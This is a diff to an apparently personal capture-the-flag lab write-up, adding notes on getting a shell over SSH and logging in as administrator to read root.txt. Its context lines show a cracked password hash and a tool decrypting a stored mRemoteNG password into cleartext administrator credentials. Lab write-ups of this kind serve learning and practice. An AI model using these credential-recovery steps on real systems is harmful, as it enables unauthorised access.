@@ -153,6 +153,7 @@ L4mpje:26112010952d963c8dc4217daec986d9:bureaulampje
 ```
 
 # user
+Connect with SSH to get shell, winrm and psexec don't seem to work with the user creds
 ```
 PS C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> dir                                                                                                      
     Directory: C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup                                                                                            
@@ -228,6 +229,8 @@ https://github.com/haseebT/mRemoteNG-Decrypt
 └─$ ./mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
 Password: thXLHM96BeKL0ER2
 ```
+
+SSH as administrator with these creds, get root.txt
 
 # creds
 |service|user|pass|
